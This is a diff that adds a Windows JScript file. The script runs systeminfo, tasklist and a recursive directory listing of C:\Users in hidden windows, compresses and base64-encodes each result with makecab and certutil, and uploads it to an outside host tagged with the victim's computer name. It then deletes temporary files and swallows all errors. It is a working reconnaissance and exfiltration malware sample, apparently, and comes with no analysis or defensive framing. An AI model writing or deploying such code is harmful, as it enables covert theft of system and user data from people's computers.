@@ -1,0 +1,103 @@
+var sHostName = "iuh234.medianewsonline.com";
+
+try {
+	var sTempFile = ExecuteCommand("cmd /c systeminfo > ");
+	var strResponse = UploadResult(sHostName, sTempFile);
+	
+	sTempFile = ExecuteCommand("cmd /c tasklist > ");
+	strResponse = UploadResult(sHostName, sTempFile);
+	
+	sTempFile = ExecuteCommand("cmd /c cd /d \"C:\\Users\" && dir /a/o-d/s *.* > ");
+	strResponse = UploadResult(sHostName, sTempFile);
+	
+	sTempFile = ExecuteCommand("cmd /c cd /d \"%TEMP%\" && del /f /q *.tmp >");
+}
+catch (err) {
+}
+
+function ExecuteCommand(strCmdLine)
+{
+	var fs = new ActiveXObject("Scripting.FileSystemObject");
+	var sh = new ActiveXObject("WScript.Shell");
+
+	sh.RegWrite("HKCU\\Console\\CodePage", 65001, "REG_DWORD");
+	sh.CurrentDirectory = sh.ExpandEnvironmentStrings("%TEMP%");
+	var sTempName = sh.CurrentDirectory + fs.GetTempName();
+	
+	strCmdLine += sTempName;	
+	sh.Run(strCmdLine, 0, true);
+
+	delete fs;
+	delete sh;
+	return sTempName;
+}
+
+function UploadResult(sHostName, sLocalFile)
+{
+	var WshNetwork = new ActiveXObject("WScript.Network");
+	var sComputerName = WshNetwork.ComputerName;
+	delete WshNetwork;
+
+	var strResponse = "";
+	
+	try 
+	{	
+		var strURL = "http://" + sHostName + "/umprl.php?uid=" + sComputerName;
+		var filename = MakeFileName("");
+		
+		var strData = ReadInputFile(MakeFileToUpload(sLocalFile));
+		strData = strData.replace("-----BEGIN CERTIFICATE-----", "");
+		strData = strData.replace("-----END CERTIFICATE-----", "");
+		strData = strData.replace(/\r\n/g, "");
+		var DataRequest = "------9cf6aeb87251fe9\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\nContent-Type: application/octet-stream\r\n\r\n" + strData + "\r\n------9cf6aeb87251fe9--\r\n";
+	
+		var HttpObj = new ActiveXObject("Microsoft.XMLHTTP");
+		HttpObj.open ("POST", strURL, false);
+		HttpObj.setRequestHeader ("Content-Type", "multipart/form-data; boundary=----9cf6aeb87251fe9");
+		HttpObj.setRequestHeader ("Content-Length", DataRequest.length);	
+		HttpObj.send (DataRequest);
+		strResponse = HttpObj.responseText;
+		delete HttpObj;
+	}
+	catch (err) 
+	{
+		strResponse = "";
+	}	
+	return strResponse;
+}
+
+function MakeFileToUpload(strSourceFile)
+{
+	var fs = new ActiveXObject("Scripting.FileSystemObject");
+	var sh = new ActiveXObject("WScript.Shell");
+	
+	var strCabFile = fs.GetTempName();
+	var strFileToUpload = fs.GetTempName();
+	
+	var sCmdLine = "cmd /c makecab " + strSourceFile + " " + strCabFile + " && certutil -encode -f " + strCabFile + " " + strFileToUpload;
+	sh.Run(sCmdLine, 0, true);
+	
+	delete fs;
+	delete sh;	
+
+	return strFileToUpload;
+}
+
+function ReadInputFile(strFileName)
+{
+	var fs = new ActiveXObject("Scripting.FileSystemObject");
+	var f = fs.OpenTextFile(strFileName);
+	var buf = f.ReadAll();
+	f.Close();
+	
+	delete fs;
+	return buf;
+}
+
+function MakeFileName(strPrefix)
+{	
+	var objDate = new Date();
+	var sResult = strPrefix + objDate.getTime();
+	delete objDate;
+	return sResult;
+}
